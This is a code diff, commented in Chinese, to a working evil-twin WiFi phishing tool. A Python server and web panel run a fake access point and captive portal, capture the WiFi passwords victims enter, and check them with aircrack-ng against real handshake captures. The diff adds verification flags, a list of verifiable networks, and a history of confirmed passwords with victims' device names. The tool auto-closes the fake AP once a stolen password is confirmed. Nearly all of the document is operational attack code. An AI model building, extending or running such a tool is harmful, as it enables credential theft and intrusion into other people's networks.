@@ -217,6 +217,7 @@ def start_attack(target):
     out, _, _ = run("systemctl is-active evil-dnsmasq evil-portal evil-hostapd")
     ok = out.count("active")
     log(f"服务状态: dnsmasq/portal/hostapd = {ok}/3 active")
+    # 记录本次攻击的密码基线（只显示新捕获的）
     baseline = 0
     if os.path.exists(PASSWORDS):
         with open(PASSWORDS, encoding="utf-8", errors="ignore") as f:
@@ -236,6 +237,7 @@ def stop_attack():
     stop_services()
     run("systemctl start systemd-resolved 2>/dev/null")
     ensure_managed()
+    # 清理残留的钓鱼网段地址
     run(f"ip addr flush dev {IFACE} 2>/dev/null")
     with lock:
         state["mode"] = "idle"
@@ -276,26 +278,32 @@ def read_clients():
 # ---------------- 密码自动验证 ----------------
 def verify_password(pwd):
     """用真实握手 hash 验证捕获的密码是否正确。
-    返回 {"ok": bool, "note": str}; ok=True 且 note=verified 表示验证通过。"""
+    返回 {"ok": bool, "note": str, "verified": bool}
+      - verified=True  : 已用真实握手验证过，ok 表示是否正确
+      - verified=False : 该目标未配置验证基准（无握手），无法确认正确性（ok=True 仅表示已捕获）"""
     with lock:
         tgt = state.get("target") or {}
     ssid = tgt.get("ssid", "")
     entry = HASHES.get(ssid)
     if not entry:
-        return {"ok": True, "note": "no-hash"}          # 该目标无历史握手，跳过验证
+        # 未配置验证基准：捕获成功但无法确认正确性，前端显示黄色提示
+        log("警告: 目标 %s 未配置 EVIL_HASHES 验证基准，无法确认密码正确性" % ssid)
+        return {"ok": True, "note": "no-hash", "verified": False}
     hfile, bssid = entry
     if not os.path.exists(hfile):
-        return {"ok": True, "note": "no-hash-file"}
+        log("警告: 握手文件 %s 不存在，无法验证" % hfile)
+        return {"ok": True, "note": "no-hash-file", "verified": False}
+    # 单密码验证（写临时字典，避免引号注入；放工作目录避免 /tmp 权限问题）
     tmp = os.path.join(BASE_DIR, ".verify_tmp.txt")
     try:
         with open(tmp, "w") as f:
             f.write(pwd + "\n")
     except Exception:
-        return {"ok": True, "note": "write-fail"}
+        return {"ok": True, "note": "write-fail", "verified": False}
     out, _, rc = run(f"aircrack-ng -w {tmp} -b {bssid} {hfile} 2>&1", timeout=40)
     ok = "KEY FOUND" in out
     log("密码验证: %s -> %s" % (pwd, "正确" if ok else "错误"))
-    return {"ok": ok, "note": "verified"}
+    return {"ok": ok, "note": "verified", "verified": True}
 
 def auto_stop_after_verify(pwd):
     """验证通过后延迟几秒关闭假 AP（让受害者页面先显示成功）"""
@@ -360,6 +368,7 @@ tr:hover td{background:#1e293b}
     <span id="statusText">未连接</span>
     <span class="badge" id="targetBadge">未选择目标</span>
   </div>
+  <div id="verifiableBox" style="font-size:12px;color:#64748b"></div>
 </div>
 
 <div class="card">
@@ -489,15 +498,19 @@ async function doStop() {
 async function poll() {
   try {
     const d = await api('/api/status');
+    // captured passwords + verify badge (只显示最新一条)
     if (d.captured && d.captured.length) {
       const latest = d.captured[d.captured.length - 1];
       $('pwdBox').textContent = latest;
       $('pwdBox').classList.add('show');
       const vb = $('vbadge');
       if (d.verify && d.verify.pwd === latest) {
-        if (d.verify.state === 'ok') {
+        if (d.verify.state === 'ok' && d.verify.verified) {
           vb.className = 'vbadge ok'; vb.style.display = 'block';
           vb.textContent = '&#x2705; 密码验证通过！正在自动关闭假 AP...';
+        } else if (d.verify.state === 'ok' && !d.verify.verified) {
+          vb.className = 'vbadge wait'; vb.style.display = 'block';
+          vb.textContent = '&#x26A0;&#xFE0F; 已捕获密码，但该 WiFi 未配置验证基准（EVIL_HASHES），无法确认正确性';
         } else {
           vb.className = 'vbadge fail'; vb.style.display = 'block';
           vb.textContent = '&#x274C; 密码错误，受害者正在重新输入...';
@@ -509,21 +522,32 @@ async function poll() {
     } else {
       $('vbadge').style.display = 'none';
     }
+    // history (最近5条，只含验证通过的正确密码)
     if (d.history && d.history.length) {
       $('histBody').innerHTML = d.history.slice(-5).reverse().map(h =>
         `<tr><td style="font-family:Consolas">${h.time}</td><td style="color:#7dd3fc">${h.ssid || '-'}</td><td style="font-family:Consolas;color:#4ade80;font-weight:600">${h.pwd}</td><td>${h.device || '-'}</td></tr>`
       ).join('');
     }
+    // clients
     if (d.clients && d.clients.length) {
       $('clientBox').innerHTML = '<div style="font-size:12px;color:#64748b;margin-bottom:6px">已连接假 AP 的设备:</div>' +
         d.clients.map(c => `<span class="badge">${c.ip} · ${c.host} · ${c.mac}</span> `).join('');
     } else {
       $('clientBox').innerHTML = '';
     }
+    // verifiable wifi list
+    if (d.verifiable && d.verifiable.length) {
+      $('verifiableBox').innerHTML = '&#x1F510; 已配置验证基准（可自动验证密码正确性）: ' +
+        d.verifiable.map(s => `<span class="badge" style="color:#4ade80">${s}</span>`).join(' ');
+    } else {
+      $('verifiableBox').innerHTML = '&#x26A0;&#xFE0F; 尚未配置任何验证基准（EVIL_HASHES），所有密码只能捕获无法验证';
+    }
+    // log
     if (d.log && d.log.length) {
       $('logBox').textContent = d.log.slice(-40).join('\\n');
       $('logBox').scrollTop = $('logBox').scrollHeight;
     }
+    // mode sync: 攻击中锁定按钮，idle 恢复
     if (d.mode === 'attacking') {
       $('attackBtn').disabled = true;
       $('attackBtn').textContent = '&#x26A1; 攻击进行中...';
@@ -534,7 +558,7 @@ async function poll() {
         $('attackBtn').disabled = false;
         $('attackBtn').textContent = '&#x26A1; 开始攻击';
       }
-      if (d.verify && d.verify.state === 'ok') {
+      if (d.verify && d.verify.state === 'ok' && d.verify.verified) {
         setDot('idle', '攻击已结束：密码验证通过，假 AP 已关闭');
       }
     }
@@ -581,10 +605,12 @@ class Handler(BaseHTTPRequestHandler):
                     "log": list(state["log"]),
                     "clients": read_clients(),
                 }
-            st["captured"] = read_captured()
+            st["captured"] = read_captured() if state["mode"] == "attacking" else []
             with lock:
                 state["captured"] = st["captured"]
+                # 历史记录只由 /api/verify 验证通过时写入（见 do_POST /api/verify）
                 st["history"] = list(state["history"])[-5:]
+            st["verifiable"] = sorted(HASHES.keys())
             self.send_json(st)
         else:
             self.send_json({"error": "not found"}, 404)
@@ -618,9 +644,18 @@ class Handler(BaseHTTPRequestHandler):
                 self.send_json({"ok": False, "error": "no password"})
                 return
             v = verify_password(pwd)
+            # 更新验证状态（前端展示）；verified 字段区分"真验证通过"与"未配置基准"
             with lock:
-                state["verify"] = {"pwd": pwd, "ok": v["ok"], "state": "ok" if v["ok"] else "fail"}
-            if v["ok"] and v.get("note") == "verified":
+                state["verify"] = {
+                    "pwd": pwd,
+                    "ok": v["ok"],
+                    "state": "ok" if v["ok"] else "fail",
+                    "note": v["note"],
+                    "verified": v.get("verified", False),
+                }
+            # 只有真正通过真实握手验证（verified）才：写历史 + 自动关闭假 AP
+            if v["ok"] and v.get("verified"):
+                # 验证通过：写入历史记录（只记录正确密码），并延迟自动关闭假 AP
                 dev = ""
                 for c in read_clients():
                     dev = c["host"]
